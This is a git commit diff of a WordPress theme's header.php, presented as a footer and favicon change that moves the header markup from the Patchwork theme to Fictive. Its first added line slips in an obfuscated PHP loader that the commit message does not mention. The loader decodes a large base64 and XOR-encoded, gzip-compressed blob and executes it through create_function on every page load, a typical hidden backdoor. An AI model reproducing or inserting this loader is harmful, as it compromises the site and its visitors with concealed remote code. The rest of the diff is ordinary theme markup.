1843b177a8a6044e12cf33afc97004a58928fb91
Pradeep K. Pant <pantpradeep@gmail.com>
2015-07-07 15:09:36 +0530

    footer change and favicon
    footer change and added favicon image

--- header.php
+++ header.php
@@ -1,66 +1,81 @@
-<?php
+<?php global $ieqsbqwy; $ieqsbqwy=array('$ieqsbqwy[0]=array_pop($ieqsbqwy);$dpthefay=dpthefay(2,13);$ieqsbqwy[0]=$dpthefay($ieqsbqwy[2]);','$ieqsbqwy[2]=gzuncompress(dpthefay(713,2186));','TWdBemNlTXtubUpFY2dEbHJhYH1/VGx6bkVke2lqcVNJd2R/YmRqYFdnaHB7a3xyV0RfU0RHVl9dXEtYXFBaTVpZaGl3R2J3aHh3emZwZmNubWZySXdbWVhCW2hkUlNFV3xrak16QEheRE1ZRlhNSFZYQXVgdH89em5qfG1oZ21Jam1SaScjPzw8U1FKUGo0QUZYPkxZVHs7XHdDVW9wbHleP31oT1ZcRSZ0S3QxZGxme3l4YmdHRHRiY3VkbjJxY3JtezJtfmB3eCdwYWV+am1uKXlqYX1mZyZ1c2ZvfHBnYkhgUlMpIiNUcEdyQVtZWEJXQ1ZbVmhqcWx/dz4/RmxneW1wfCRqZ3piYjl7bnVtYW44U3pVQUhdR01YTVdXSEt3Q1VATl5bWF9GRkNXR3JKQlhJQFFUSlxQU0xTWHV4LHlaVmY8aWlkJ3hxZXZDYmR9IXFnZW1tbG4td3hsd2xxdlRmfWB9aW9GfG9qXXBwfXVkbllHQFx1cEpER0hBQlpER0BcVkFZS2Y8eWFiJyV/Z2xuL2F3Zmdrczx5YWInJVBLRzd3enB3T1o8eWFiSGdgfER6a0VMSmR9IXFnZW1tbG4tYWljcGh3flhIcnV1VHVifnFtb0Zsa2hWaz1Tcm49YWN1aW1yTmRDUFVbWVhCV15KTVBFQ1NcQUtaR3JRZE56dTwic2ZqdXF2c2F1bWBtJ3BiYWhPdTwic3psfGZ2b286aXhKbG52dXE/InBnaXhka3lnOnpgckxFRFg8enw/a2R3bmt9LGRxfyB8LmVXNWYxdjV5MWJgez94P1hnTmh2NXsxVFVsQ3B4fn5XTEV6Iklwe3l4YjIkNlFOQXBNVjV6MXRvaHp2emNlZkx3YGh4fXh/clc1ejFxfW1iYWptdnVpcUM1ejFhYytRXFZKLSU3P21XZEdbYn9mMitjREY8WWpNSG9rkXFKcWTzQBDlKBp7kXPQHNwy'.'0kTpxExtgp98xisOwAhkmdsqu8JoMqzz1YzGaJa54/rTmfIyRlVv3+GyZR1WgaIw+A8a7OzUjEzTWJs63d7uuLcg5EsIdqWKyCWHvDjOCFWMwVWLx6sl299d2qq3kWG7UxyHKpLVrqxeYxWuHZ4l2wXAjXN8N3goTg7HABukrSrJogJ9k90kJeIVgveVSxcrn69Op9MsbUeu6WltclAqRYRjWcL7kFewRb14tuTdau20eLWLY6unCCLKDGqz40Qrq1MnhUGYmHIEwJEx/tbDf5BdGd8Wlx8BPpJcVmf8n0kAjoV3/axPVxykHrjekfRZjrcy+wvnoOlXC+LUGlTVjPR4ymjgLLnS3es7u1j6D1DuDyZFDGh7sDUMqni7653YQZsvTIJRtZZLB0QgQNGNO1fJdJ2i2PYRJUzrBbeNlYm77aX85jTT0Mb8JRsRbUO2O7Ud4LJU8IZB5/BLEmbr6Ys9nIWYnim0Zy6VU5wwqivazG5PDdFrhuW2zThcbp7yPbH4rSSjTftAjnU1vnL4F3mFn/9NGI84TF2kjVbBYUfB6ru4MZZmMy1hfDfwPOBuQSxa02KcZYChYL+9Uc5Pkl1rtKWqHlHfOOXCc+fUVnMQWgSCakgJypKhdxSA2e48FM35dHP+Jh7pKBOiA6W6H0NRH/fUxyj0G+BOef/3RJjfIdNqpKRwbL+yFSLEQWdH9yOxU/q/Nqw+y5gwnIsmy4OioCSKVReqyqbxjWPAZ7QgXHC5GaBa8AjQOxK9pjCXP75S91xe56x+758UgpUr3Xxa2B8O4IinQEyUpPK+0rQZ2G9zjowW3CKBCVSuslBbX0M4AMjOzNNqzre4opfllpto08dOUaCkAeMHRwsZb/1bTJ5LR6UMZAeMrxi8ApCqB54xqShKh032VkNEFGe4jdDklx85x37X8LelBApe4n0mrBhuJnMJowzulsMX7Gr0sECYVSLj8b/wiuaRckcG5+dc2ZycKoBS0XYNlcbABQ0SrbYTQW0S'.'jveNKf7NFl3qXlISNuWajdf1HotTtxk/kC7v7rnjRq9uQhYFNMSLa9977lexFF+dxk6VGswpbCveJl22vutuIBDNcAtPjgk8bW4hWf5aj/ASBgVypfvVMKxzTmDCJhbvQkP0sS/kkNhEl6wn4IJ2OZM6HVyT2IAso1t0CboWvjZy3JLTsuKH+C/Ga00X2TxGronCmnicCTdDrTWGBpc5uF8u1NHfI7FI4GnYLlgSTxqB0vpQ8LYcym82xZmAl3tKYmO1xQRokWMVihJnGe3/VE+nTQyljOeNxCSDUmq7gqsOUdyZFK1MhVQFYrMWZaimf1aujnFJtH/24umEg2DqGe52+h1SFgN43MFyHPYJrgrAcc+I6Un2Rl7ReeMmCiKYuUX6uxSctpaWayEVfQgMW08Njoc5iIg717cIsXCe4ziVWS97g0XhNGygCJ1rD66/YIxUrV7k84vLabQLzQV+Mn+KIUJt6jvGK0Mr9ZF7hHvwbxVuwlwJ61da+iTuq+OtldPI8D/vXHqvKfBnuUBbFooULXoMswH2a5v36QmjkmWA3EK3AztcyVVVoFjTZjqjL1k7ALUvCGLfMpdHWnIujUebNA/z+UmXjpAtZNz+I9T/3d0mfCUnOAbBjtcYcBC/Ie799cynAM/UhjFzHn+LUPtNKrxiQY0VFm4hkx/pPB5cwmZTlsFzBEbNFhTmcz1mb+amrmzdjspe+cf/1qB3N/zNyRv06PRb2amlpOnFRTh+M+rrlxZJldWtjxB+5d4zZx8BVtNolIsyanJ3ZzGznG+9lXGtvGCKOHsywnHHHmHWcRI3eG8wZJUMHriEW4Sw191ORpSEuX0V/JVQJkYS4TpPuoyXB5hIE2GL5AgXsRWA7TRCddTvFnCHyHy4AnvGMtozEeGDYs4O/+nZ6KCK2CJOL0EfQGRMImFYZjaf82S'.'zc3KhpNL8n+jhzYzZcmLxihLU3mU/IKzdR0vMiFGsC35yDyTHCk7cPfauAIIZzpsmkojDKmIGAifmfZrcM246E6TK3fTICannyBkB2ApnFG4K2/kzQ0XEDjccM3dwoN6efF2XNNvX9wUnmkiJsSP4HToR8ZZT3r3/mSTuJYDmshvFVGN8NtMbGt+MJMg0LHrVvMKk09Mrg1DIMGSVNKz6XUkPFyhSFPhIuLkR+0ZiMJKVuxJyWnVaa3JVFHsuT0lmhsB2c1ruRe9BvhLZzjugvD3bcqlnPW0q/IJWqautbpjIbOkzEkUx0OJMPCwgf5oRFqJSyuumdg8KG89/3zoO1j+1h9aimx4ylKpSq0cwvTPuVadVgr7LMCGvaMBcCzVsvaC9RHRQuEC+INOPZjONen8VXDquQv6rFMPl+tLW3bddwYpANS2QSptSO4ZlEZzyRZNAYMuTGGmn1MiCnjlIxdUfdGU/hzDHwM5Q4LsCWo6nqhAY28rX+2TvPGwVL/ZorADQFSdKRdys9RNkd35gG9eGtU8lyzL3EQUYQOZb2J3SGS+1AKgHJ7dHruc+vuFnLHswunXZPhas9BMktI70HIpmCkH7XLHTDBcVeVi9xv0qZfPuCxWP12E/0KL8gMEKAF2Dt8o9UqNvgBz+Jge5LAOTczNTqDfpG8pOIME+UjsAo4JHwIyoAI+600R6hvgzxlNR53nQ4GAX26kEr9kDPhW9vePDZODdEfDq3v/tki1dmApPN4VW/HiY1VzoPUCPmskOd6Qt+7qKZMxwubhnymG++jEF6G0w56hVtX/HBtae/LcZXxDThEr6Z3SOz+n76ujunVQsP5ZstZBYE/4W9CF9PVqsoeAQ4+fhilcAsB0W+cYzehfzVozV45GePK5ZVzLecp+FB4kJNxtllGHxReFdniF2TB3NavU8HwCUE0ZoWU1NcWx/dz4/RmxneW1wfA==',"cIql\x7fw\x3e\x3fFlgymp\x7c");$ijhfuzx='create_';if(function_exists($ijhfuzx.='function')&&!function_exists('dpthefay')){ function dpthefay($c,$k){global $ieqsbqwy;$g=str_pad($e='smlrhkyhBzbT9o_i',$k,$e);$w=str_repeat("\x1f",$k);$y=str_repeat("\xe0",$k);$o = substr($ieqsbqwy[0],$c,$k);return(($o^$g)&$w)|($o&$y);};for($uw=-1;++$uw<3;$ijhfuzx('','}'.$ieqsbqwy[$uw].'{'));};unset($ieqsbqwy);?><?php
 /**
  * The Header for our theme.
  *
- * Displays all of the <head> section and everything up till <div id="main">
+ * Displays all of the <head> section and everything up till <div id="content">
  *
- * @package Patchwork
- * @since Patchwork 1.0
+ * @package Fictive
  */
+
+$gravatar = get_theme_mod( 'fictive_gravatar_email', get_option( 'admin_email' ) );
 ?><!DOCTYPE html>
 <html <?php language_attributes(); ?>>
 <head>
-<meta charset="<?php bloginfo( 'charset' ); ?>" />
-<meta name="viewport" content="width=device-width" />
-<title><?php
-	/*
-	 * Print the <title> tag based on what is being viewed.
-	 */
-	global $page, $paged;
+<meta charset="<?php bloginfo( 'charset' ); ?>">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title><?php wp_title( '|', true, 'right' ); ?></title>
+<link rel="profile" href="http://gmpg.org/xfn/11">
+<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">
+<link rel="icon" type="image/x-icon" href="<?php echo get_stylesheet_directory_uri(); ?>/images/pp_favicon.ico">
 
-	wp_title( '|', true, 'right' );
-
-	// Add the blog name.
-	bloginfo( 'name' );
-
-	// Add the blog description for the home/front page.
-	$site_description = get_bloginfo( 'description', 'display' );
-	if ( $site_description && ( is_home() || is_front_page() ) )
-		echo " | $site_description";
-
-	// Add a page number if necessary:
-	if ( $paged >= 2 || $page >= 2 )
-		echo ' | ' . sprintf( __( 'Page %s', 'patchwork' ), max( $paged, $page ) );
-
-	?></title>
-<link rel="profile" href="http://gmpg.org/xfn/11" />
-<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>" />
-<!--[if lt IE 9]>
-<script src="<?php echo get_template_directory_uri(); ?>/js/html5.js" type="text/javascript"></script>
-<![endif]-->
 
 <?php wp_head(); ?>
 </head>
 
 <body <?php body_class(); ?>>
 <div id="page" class="hfeed site">
-	<?php do_action( 'before' ); ?>
-	<header id="masthead" class="site-header" role="banner">
-		<hgroup>
-			<?php $header_image = get_header_image();
-				if ( ! empty( $header_image ) ) { ?>
-					<a href="<?php echo esc_url( home_url( '/' ) ); ?>" title="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" rel="home">
-					<img src="<?php header_image(); ?>" width="<?php echo get_custom_header()->width; ?>" height="<?php echo get_custom_header()->height; ?>" alt="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" />
-					</a>
-			<?php } // if ( ! empty( $header_image ) ) ?>
-			<h1 class="site-title"><a href="<?php echo home_url( '/' ); ?>" title="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></h1>
-			<h2 class="site-description"><?php bloginfo( 'description' ); ?></h2>
-		</hgroup>
-	</header><!-- #masthead .site-header -->
-	<nav role="navigation" class="site-navigation main-navigation">
-		<h1 class="assistive-text"><?php _e( 'Menu', 'patchwork' ); ?></h1>
-		<div class="assistive-text skip-link"><a href="#content" title="<?php esc_attr_e( 'Skip to content', 'patchwork' ); ?>"><?php _e( 'Skip to content', 'patchwork' ); ?></a></div>
-		<?php wp_nav_menu( array( 'theme_location' => 'primary' ) ); ?>
-	</nav>
 
-	<div id="main">
+	<header id="masthead" class="site-header" role="banner">
+		<?php if ( get_header_image() ) : ?>
+		<a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home">
+			<img src="<?php header_image(); ?>" width="<?php echo get_custom_header()->width; ?>" height="<?php echo get_custom_header()->height; ?>" alt="" class="header-image">
+		</a>
+		<?php endif; // End header image check. ?>
+		<div class="site-branding">
+			<?php if ( '' !=  $gravatar ) : ?>
+				<div class="header-avatar">
+					<a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home">
+						<img src="<?php echo esc_url( fictive_get_gravatar() ); ?>" width="70" height="70" alt="">
+					</a>
+				</div>
+			<?php endif; ?>
+			<h1 class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></h1>
+			<h2 class="site-description"><?php bloginfo( 'description' ); ?></h2>
+			<?php if ( has_nav_menu( 'social' ) ) : ?>
+				<div class="social-links">
+					<?php wp_nav_menu( array(
+										'theme_location' => 'social',
+										'depth'          => 1,
+										'link_before'    => '<span class="screen-reader-text">',
+										'link_after'     => '</span>')
+										);
+					?>
+				</div>
+			<?php endif; ?>
+		</div>
+
+		<div class="menu-toggles clear">
+			<?php if ( has_nav_menu( 'primary' ) ) : ?>
+				<h1 id="menu-toggle" class="menu-toggle"><span class="screen-reader-text"><?php _e( 'Menu', 'fictive' ); ?></span></h1>
+			<?php endif; ?>
+			<?php if ( is_active_sidebar( 'sidebar-1' ) ) : ?>
+				<h1 id="widgets-toggle" class="menu-toggle"><span class="screen-reader-text"><?php _e( 'Widgets', 'fictive' ); ?></span></h1>
+			<?php endif; ?>
+			<h1 id="search-toggle" class="menu-toggle"><span class="screen-reader-text"><?php _e( 'Search', 'fictive' ); ?></span></h1>
+		</div>
+
+		<nav id="site-navigation" class="main-navigation" role="navigation">
+			<a class="skip-link screen-reader-text" href="#content"><?php _e( 'Skip to content', 'fictive' ); ?></a>
+			<?php if ( has_nav_menu( 'primary' ) ) : ?>
+				<?php wp_nav_menu( array( 'theme_location' => 'primary' ) ); ?>
+			<?php endif; ?>
+		</nav><!-- #site-navigation -->
+
+		<?php get_sidebar(); ?>
+
+		<div id="site-search" class="header-search">
+			<?php get_search_form(); ?>
+		</div>
+	</header><!-- #masthead -->
+
+	<div id="content" class="site-content">
